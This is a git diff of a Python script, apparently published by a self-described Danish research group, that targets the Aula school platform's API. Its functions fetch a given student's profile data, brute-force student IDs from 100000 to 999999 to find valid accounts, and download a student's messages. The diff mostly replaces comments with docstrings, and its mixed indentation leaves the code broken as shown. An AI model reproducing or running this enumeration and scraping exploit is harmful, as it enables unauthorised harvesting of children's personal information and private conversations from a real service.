@@ -27,27 +27,26 @@ Project by Wrec & H4xton ~ The Binary.club team is a collective of Danish resear
 
 import requests
 
-# Here we define our Class
+
 class Aula:
 
     def ReceiveStudenInformation(StudentID):
+      
+      """ Get all information about the student. """
 
-        # We Send our Request to the server.
         res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=false")
 
-        # We get the response.
         print(res.text)
 
 
     def ScrapeAula():
+      
+      """ Scrapes all ID's between 100000 ... 999999, for possible students. """
 
-        # We define our ID Bruteforcer.
         for StudentID in range(100000, 999999):
 
-            # Here we parse our guesed Student ID into our url and sends the request.
             res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=true")
 
-            # We get the response and check the status code.
             if res.status_code == 200:
                 print(f"{StudentID} ~ Is a valid ID and is being used by a student")
 
@@ -56,9 +55,9 @@ class Aula:
 
 
     def ScrapeMessages(StudentID):
-
-        # We define our request.
+      
+      """ Get all conversations by student. """
+      
         res = requests.get(f"https://www.aula.dk/api/v12/?method=messages.getMessages&instProfileIds[]={StudentID}&fromAdministration=false")
 
-        # We get the response.
         print(res.text)
